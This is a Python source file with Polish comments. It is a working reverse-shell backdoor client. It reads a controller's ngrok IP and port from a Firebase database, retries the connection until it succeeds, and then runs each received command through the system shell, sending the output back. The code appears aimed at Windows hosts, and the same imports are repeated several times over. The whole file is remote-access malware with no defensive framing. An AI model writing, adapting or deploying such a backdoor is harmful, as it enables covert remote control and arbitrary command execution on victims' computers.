# Potrzebne biblioteki
import socket
import threading
import sys
import socket
import subprocess
import firebase_admin
from firebase_admin import credentials
from firebase_admin import db
import uuid
import datetime
import json
import win32gui
import win32con
import socket
import subprocess
import firebase_admin
from firebase_admin import credentials
from firebase_admin import db
import uuid
import datetime
import json
import win32gui
import win32con
import socket
import threading
import sys
import socket
import subprocess
import firebase_admin
from firebase_admin import credentials
from firebase_admin import db
import uuid
import datetime
import json
import win32gui
import win32con
from tkinter import *
import firebase_admin
from firebase_admin import credentials
import time
from firebase import firebase
import sys
from pprint import pprint

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


# Klucze biblioteki google firebase
cred = credentials.Certificate(
    {
#your certificate
    }
)
firebase_admin.initialize_app(cred, {
#your firebase addres
})
# Zmienna int o nazwie id przechowująca identyfikator komunikacji
id = 0


def receive(socket, signal):

    while signal:
        # Odbieranie danych
        data = socket.recv(32)
        print("")
        # Dekodowanie danych
        print(str(data.decode("utf-8"))+"\n")
        dane = data.decode("utf-8")
        xxx = dane.split(",")

        if xxx[0] == "///":
            # Pobieranie nie powtarzalnego id
            print("przyjęto identyfikator")
            global id
            id = xxx[1]
            # Zakończenie funkcji
            break
        else:
            if dane != "":
                # Dzielenie danych na fagmenty
                command = dane.split("~")
                # Uruchamienia polenenia
                op = subprocess.Popen(
                    command[1], shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
                # Pobiernaie wyniku operacji
                output = op.stdout.read()
                output_error = op.stderr.read()
                # Wysłanie odpowiedzi
                sock.sendall(str.encode(
                    id+"~"+command[0]+"~"+str(output)+" - "+str(output_error)))
                print("wyłałem: "+id+"~" +
                      command[0]+"~"+str(output)+" - "+str(output_error))
                # Zakończenie funkcji
                break
            else:
                print("pusto")
                # Zakończenie funkcji
                break

    return ()


# Pobranie ip
ref = db.reference("ngrok/ip/")
data = ref.get()
host = data

# Pobranie Portu
ref = db.reference("ngrok/port/")
data = ref.get()
port = data

# Funkcja łączenia


def connect():
    a = 0

    while a == 0:
        try:
            # próba łączenia
            sock.connect((host, port))
            a = 1
        except:
            print("Nie udana próba połaczenia")


connect()


# Tworzenie odpowiedzi na przyjęcie wiadmomości
while True:
    i = 0
    receiveThread = threading.Thread(target=receive, args=(sock, True))
    receiveThread.start()
